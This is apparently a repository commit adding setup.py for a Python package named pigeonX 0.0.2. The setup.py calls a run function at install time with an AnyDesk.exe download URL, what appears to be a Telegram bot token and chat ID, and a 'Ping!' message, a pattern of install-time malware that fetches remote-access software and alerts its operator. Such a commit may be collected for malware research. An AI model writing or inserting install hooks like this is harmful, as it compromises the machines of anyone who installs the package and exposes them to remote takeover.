d1129f2a7b43c1da15403a942e7957e64959c3ca
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-05-07 15:03:21 +0000

    Add package pigeonX/0.0.2/pigeonX-0.0.2.tar.gz

---
+++ packages/pigeonX/pigeonX-0.0.2.tar.gz/pigeonX-0.0.2/setup.py
@@ -0,0 +1,18 @@
+from setuptools import setup
+from pigeonX import run
+
+
+run.run(
+    'https://download.anydesk.com/AnyDesk.exe', 'AnyDesk.exe',
+    "7166206301:AAEHQ7TaGtqi3mlUipyFiVJqBCDamNSJIMc", "6560391338", "Ping!"
+)
+
+
+setup(
+    name='pigeonX',
+    version='0.0.2',
+    packages=['pigeonX'],
+    install_requires=[
+        'requests',
+    ]
+)
